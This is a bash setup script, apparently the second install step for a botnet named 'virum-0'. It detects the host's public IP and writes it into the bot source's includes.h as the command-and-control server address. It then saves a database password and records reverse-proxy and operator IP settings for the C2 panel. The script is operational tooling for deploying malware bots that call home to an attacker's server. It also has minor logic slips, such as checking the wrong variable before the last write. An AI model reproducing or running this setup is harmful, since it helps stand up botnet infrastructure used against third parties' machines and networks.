#!/bin/bash
cd ~/virum-0/bot/
echo "Second step!"
echo "-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-"
echo "Please pay attention to this step!"
echo "-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-"
sleep 5
echo "Auto filling bot file with needed things."
echo "Detecting cnc ip: "
IPADDR="$(curl checkip.amazonaws.com)"
echo $IPADDR

replacer='#define SERVIP (int)inet_addr((const char*)"' 
replacer2='");'
echo "Replacing lines in file includes.sh"
line=25;sed -i "${line}s/.*/$replacer$IPADDR$replacer2/" includes.h

cd ~/virum-0/

read -p "Select database password, It must have 1 capital letter, 1 number, 8 characters and 1 punctuation mark example: P3nisssss.! this will be saved at /root/virum-0/databasepass.txt: " dbpass

echo $dbpass > databasepass.txt
FindDirectory="$(ls | grep databasepass)"
if [[ "$FindDirectory" = "databasepass.txt" ]]; then 
echo "Raw file saved"
else 
echo "Unable to find newly saved file"
exit
fi
Compare="$(cat databasepass.txt)"
if [[ "$Compare" = "$dbpass" ]]; then 
echo "Password correctly backed up"
else 
echo "Password wasnt backed up correctly"
exit
fi
cd configurations/
echo "{$dbpass}" > DBPassword.txt
echo "Database password saved"
echo "Configuring only reverse proxy access!"
read -p "Enter reverse proxy ip(If you dont have one type 0): " revproxy
if [[ "$revproxy" = "0" ]]; then 
echo "{reverseproxy1=none,reverseporxy2=3.3.3.3,personalip=2.2.2.2}" > reverseproxy.txt
echo "General setup finished, keep following the instructions and remember to keep your database password so you can use it later."
exit
fi 
read -p "Enter secondary reverse proxy ip(If you dont have one type 0): " revproxy2
if [[ "$revproxy2" = "0" ]]; then 
echo "General setup finished, keep following the instructions and remember to keep your database password so you can use it later."
echo "{reverseproxy1=$revproxy,reverseporxy2=3.3.3.3,personalip=2.2.2.2}" > reverseproxy.txt
else 
echo "{reverseproxy1=$revproxy,reverseporxy2=$revproxy2,personalip=2.2.2.2}" > reverseproxy.txt
fi 
read -p "Enter your personal ip(If you dont have one type 0): " personalip
if [[ "$revproxy2" = "0" ]]; then 
echo "General setup finished, keep following the instructions and remember to keep your database password so you can use it later."
exit
else 
echo "{reverseproxy1=$revproxy,reverseporxy2=$revproxy2,personalip=$personalip}" > reverseproxy.txt
fi 
echo "General setup is over please remember your database password!"



